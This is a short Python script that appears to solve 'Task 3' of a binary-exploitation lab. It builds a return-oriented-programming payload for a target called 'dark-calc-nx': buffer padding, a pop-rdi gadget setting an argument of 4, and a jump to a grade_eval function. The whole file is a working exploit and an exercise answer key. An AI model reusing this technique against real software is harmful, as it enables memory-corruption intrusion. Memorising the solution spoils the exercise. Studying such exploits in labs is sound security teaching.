#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx."""
import sys

pop_rdi = 0x401a33
ret = 0x401a34
grade_eval = 0x401978

payload = b"A" * 24
payload += pop_rdi.to_bytes(8, "little")
payload += (4).to_bytes(8, "little")
payload += ret.to_bytes(8, "little")
payload += grade_eval.to_bytes(8, "little")

sys.stdout.buffer.write(payload)